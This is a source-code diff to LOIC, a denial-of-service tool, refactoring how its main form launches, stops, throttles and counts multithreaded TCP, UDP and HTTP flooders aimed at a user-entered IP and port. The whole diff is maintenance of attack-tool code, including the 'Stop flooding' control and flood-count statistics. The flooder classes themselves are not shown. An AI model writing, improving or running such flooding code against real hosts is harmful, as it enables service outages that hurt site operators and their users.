@@ -17,8 +17,7 @@ namespace LOIC
 	{
 		const string AttackText = "IMMA CHARGIN MAH LAZER";
 
-		private XXPFlooder[] xxp;
-		private HTTPFlooder[] http;
+		private IFlooder[] arr;
 		private string sHost, sIP, sMethod, sData, sSubsite;
 		private int iPort, iThreads, iDelay, iTimeout;
 		private Protocol protocol;
@@ -85,6 +84,8 @@ namespace LOIC
 		{
 			if((cmdAttack.Text == AttackText && toggle) || (!toggle && on))
 			{
+				if(tShowStats.Enabled) tShowStats.Stop();
+
 				if (!int.TryParse (txtPort.Text, out iPort) || iPort < 0 || iPort > 65535) {
 					Wtf ("I don't think ports are supposed to be written like THAT.", silent);
 					return;
@@ -135,22 +136,22 @@ namespace LOIC
 
 				cmdAttack.Text = "Stop flooding";
 
-				if(sMethod.Equals("TCP") || sMethod.Equals("UDP"))
+				if(protocol == Protocol.TCP || protocol == Protocol.UDP)
 				{
-					xxp = new XXPFlooder[iThreads];
-					for (int a = 0; a < xxp.Length; a++)
+					arr = new XXPFlooder[iThreads];
+					for (int a = 0; a < arr.Length; a++)
 					{
-						xxp[a] = new XXPFlooder(sIP, iPort, (int) protocol, iDelay, chkWaitReply.Checked, sData, chkAllowRandom.Checked);
-						xxp[a].Start();
+						arr[a] = new XXPFlooder(sIP, iPort, (int) protocol, iDelay, chkWaitReply.Checked, sData, chkAllowRandom.Checked);
+						arr[a].Start();
 					}
 				}
-				if(sMethod.Equals("HTTP"))
+				if(protocol == Protocol.HTTP)
 				{
-					http = new HTTPFlooder[iThreads];
-					for (int a = 0; a < http.Length; a++)
+					arr = new HTTPFlooder[iThreads];
+					for (int a = 0; a < arr.Length; a++)
 					{
-						http[a] = new HTTPFlooder(sHost, sIP, iPort, sSubsite, chkWaitReply.Checked, iDelay, iTimeout, chkAllowRandom.Checked, chkAllowGzip.Checked);
-						http[a].Start();
+						arr[a] = new HTTPFlooder(sHost, sIP, iPort, sSubsite, chkWaitReply.Checked, iDelay, iTimeout, chkAllowRandom.Checked, chkAllowGzip.Checked);
+						arr[a].Start();
 					}
 				}
 				tShowStats.Start();
@@ -158,21 +159,13 @@ namespace LOIC
 			else if(toggle || !on)
 			{
 				cmdAttack.Text = AttackText;
-				if(xxp != null)
+				if(arr != null)
 				{
-					for (int a = 0; a < xxp.Length; a++)
+					for (int a = 0; a < arr.Length; a++)
 					{
-						xxp[a].Stop();
+						arr[a].Stop();
 					}
 				}
-				if(http != null)
-				{
-					for (int a = 0; a < http.Length; a++)
-					{
-						http[a].Stop();
-					}
-				}
-				//tShowStats.Stop();
 			}
 		}
 
@@ -183,10 +176,14 @@ namespace LOIC
 		/// <param name="silent">If set to <c>true</c> silent.</param>
 		private void Wtf(string message, bool silent = false)
 		{
-			if (silent)
+			if (silent) {
 				return;
-			new frmWtf().Show();
-			MessageBox.Show(message, "What the shit.");
+			}
+
+			using (Form frmWtf = new frmWtf()) {
+				frmWtf.Show();
+				MessageBox.Show(message, "What the shit.");
+			}
 		}
 
 		/// <summary>
@@ -761,16 +758,18 @@ namespace LOIC
 		{
 			if(intShowStats) return; intShowStats = true;
 
-			if(xxp != null && (protocol == Protocol.TCP || protocol == Protocol.UDP))
+			if(arr != null && (protocol == Protocol.TCP || protocol == Protocol.UDP))
 			{
 				int iFloodCount = 0;
+				XXPFlooder[] xxp = (XXPFlooder[]) arr;
+
 				for (int a = 0; a < xxp.Length; a++)
 				{
 					iFloodCount += xxp[a].FloodCount;
 				}
 				lbRequested.Text = iFloodCount.ToString();
 			}
-			if(http != null && protocol == Protocol.HTTP)
+			if(arr != null && protocol == Protocol.HTTP)
 			{
 				int iIdle = 0;
 				int iConnecting = 0;
@@ -779,20 +778,21 @@ namespace LOIC
 				int iDownloaded = 0;
 				int iRequested = 0;
 				int iFailed = 0;
+				HTTPFlooder[] http = (HTTPFlooder[]) arr;
 
 				for (int a = 0; a < http.Length; a++)
 				{
 					iDownloaded += http[a].Downloaded;
 					iRequested += http[a].Requested;
 					iFailed += http[a].Failed;
-					if(http[a].State == HTTPFlooder.ReqState.Ready ||
-						http[a].State == HTTPFlooder.ReqState.Completed)
+					if(http[a].State == ReqState.Ready ||
+						http[a].State == ReqState.Completed)
 						iIdle++;
-					if(http[a].State == HTTPFlooder.ReqState.Connecting)
+					if(http[a].State == ReqState.Connecting)
 						iConnecting++;
-					if(http[a].State == HTTPFlooder.ReqState.Requesting)
+					if(http[a].State == ReqState.Requesting)
 						iRequesting++;
-					if(http[a].State == HTTPFlooder.ReqState.Downloading)
+					if(http[a].State == ReqState.Downloading)
 						iDownloading++;
 				}
 				lbFailed.Text = iFailed.ToString();
@@ -815,18 +815,11 @@ namespace LOIC
 		private void tbSpeed_ValueChanged(object sender, EventArgs e)
 		{
 			iDelay = tbSpeed.Value;
-			if(http != null)
+			if(arr != null)
 			{
-				for (int a = 0; a < http.Length; a++)
+				for (int a = 0; a < arr.Length; a++)
 				{
-					if(http[a] != null) http[a].Delay = iDelay;
-				}
-			}
-			if(xxp != null)
-			{
-				for (int a = 0; a < xxp.Length; a++)
-				{
-					if(xxp[a] != null) xxp[a].Delay = iDelay;
+					if(arr[a] != null) arr[a].Delay = iDelay;
 				}
 			}
 		}
